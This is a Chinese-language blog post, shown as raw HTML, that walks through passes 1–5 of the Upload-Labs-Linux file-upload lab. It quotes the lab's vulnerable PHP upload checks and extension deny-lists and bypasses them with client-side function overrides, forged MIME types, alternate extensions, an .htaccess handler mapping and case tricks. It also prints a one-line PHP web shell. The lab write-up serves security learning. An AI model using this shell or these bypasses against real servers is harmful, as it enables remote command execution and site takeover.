
<!DOCTYPE html>
<html lang="zh-cn" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Upload-Labs-Linux - ExceptionB`s Small Room</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Blog,"> 
    <meta name="description" content="Upload-Labs-LinuxPass 1看了一下页面的代码，发现如下内容
1234567&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; met,"> 
    <meta name="author" content="ExceptionB Ch. (aka 鲤唐可可)"> 
    <link rel="alternative" href="atom.xml" title="ExceptionB`s Small Room" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
    
    
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:title" content="Upload-Labs-Linux - ExceptionB`s Small Room"/>
    <meta name="twitter:description" content="Upload-Labs-LinuxPass 1看了一下页面的代码，发现如下内容
1234567&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; met,"/>
    
    
    
    
    <meta property="og:site_name" content="ExceptionB`s Small Room"/>
    <meta property="og:type" content="object"/>
    <meta property="og:title" content="Upload-Labs-Linux - ExceptionB`s Small Room"/>
    <meta property="og:description" content="Upload-Labs-LinuxPass 1看了一下页面的代码，发现如下内容
1234567&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; met,"/>
    
<link rel="stylesheet" href="/css/diaspora.css">

    <script>window.searchDbPath = "/search.xml";</script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="loading">
    <span id="config-title" style="display:none">ExceptionB`s Small Room</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://ray.akarin.tk"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">Upload-Labs-Linux</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">Upload-Labs-Linux</h1>
        <div class="stuff">
            <span>十月 01, 2022</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>


        </div>
        <div class="content markdown">
            <h1 id="Upload-Labs-Linux"><a href="#Upload-Labs-Linux" class="headerlink" title="Upload-Labs-Linux"></a>Upload-Labs-Linux</h1><h2 id="Pass-1"><a href="#Pass-1" class="headerlink" title="Pass 1"></a>Pass 1</h2><p>看了一下页面的代码，发现如下内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>思路就比较清楚了，在页面上搜索checkFile，找到如下内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//定义允许上传的文件类型</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//提取上传文件的类型</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//判断上传文件类型是否允许上传</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(errMsg);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>emmmm……直接到控制台，输入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkFile = <span class="function">() =&gt;</span> &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;;</span><br></pre></td></tr></table></figure>

<p>再上传个1.php，完事了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Pass-2"><a href="#Pass-2" class="headerlink" title="Pass 2"></a>Pass 2</h2><p>客户端看起来和第一天没有什么区别，故技重施，发现</p>
<blockquote>
<p>提示：文件类型不正确，请重新上传！</p>
</blockquote>
<p>没事，在做Pass 1的时候，就已经有了planB，还记得Pass 1的那段<code>&lt;form&gt;...&lt;/form&gt;</code>吗<br>直接用postman构造请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Pass-02/index.php HTTP/1.1</span><br></pre></td></tr></table></figure>
<p>body设置为form-data，添加upload_file，并设置content-type为image/jpeg，value设置为刚刚的1.php<br>结果发现不可以，点了查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还要添加一个submit，value随便填<br>轻敲Send，这题pass了</p>
<h2 id="Pass-3"><a href="#Pass-3" class="headerlink" title="Pass 3"></a>Pass 3</h2><p>把刚刚pass 1h和pass 2的方法都试一遍，结果都是</p>
<blockquote>
<p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！<br>查看源码</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次对文件名做了检查，但是检查的比较少，把文件名1.php改成1.php3可以逃课（x</p>
<h2 id="Pass-4"><a href="#Pass-4" class="headerlink" title="Pass 4"></a>Pass 4</h2><p>查看源码，和pass 3的区别只在于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>刚刚pass 3的方法在这里行不通了，只能探索别的方法</p>
<p>其实和pass 3对比一下，可以猜到这两题的思路就是利用后缀名做手脚，现在.php和.php3等后缀名被禁用了，只能拥抱别的后缀名，其实.php和.php3没什么区别，因为他们的MIME type都是<code>application/x-httpd-php</code>。<br>思路来了，能不能用别的后缀名，把它的MIME type设置为<code>application/x-httpd-php</code>？<br>可以！上面禁用了一大堆后缀，但是没有<code>.htaccess</code><br>所以新建文件<code>.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php_</span><br></pre></td></tr></table></figure>
<p>先上传.htaccess，再上传1.php_，这题结束</p>
<h2 id="Pass-5"><a href="#Pass-5" class="headerlink" title="Pass 5"></a>Pass 5</h2><p>查看源码，和pass 3/4的区别在于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>以及，少了一行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure>
<p>有这好事（<br>直接上传1.phP，pass了</p>
<h1 id="摸了"><a href="#摸了" class="headerlink" title="摸了"></a>摸了</h1><p>累了，后面的之后再写</p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                        
                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                </ul>
            
        </div>
        
        
    <div id="gitalk-container" class="comment link"
		data-enable="false"
        data-ae="false"
        data-ci=""
        data-cs=""
        data-r=""
        data-o=""
        data-a=""
        data-d="false"
    >查看评论</div>


    </div>
    
        <div class="side">
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Upload-Labs-Linux"><span class="toc-number">1.</span> <span class="toc-text">Upload-Labs-Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-1"><span class="toc-number">1.1.</span> <span class="toc-text">Pass 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-2"><span class="toc-number">1.2.</span> <span class="toc-text">Pass 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-3"><span class="toc-number">1.3.</span> <span class="toc-text">Pass 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-4"><span class="toc-number">1.4.</span> <span class="toc-text">Pass 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-5"><span class="toc-number">1.5.</span> <span class="toc-text">Pass 5</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%91%B8%E4%BA%86"><span class="toc-number">2.</span> <span class="toc-text">摸了</span></a></li></ol>
        </div>
    
</div>


    </div>
</div>
</body>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



<script type="text/x-mathjax-config">
    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
        messageStyle: "none"
    });
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
</script>




</html>
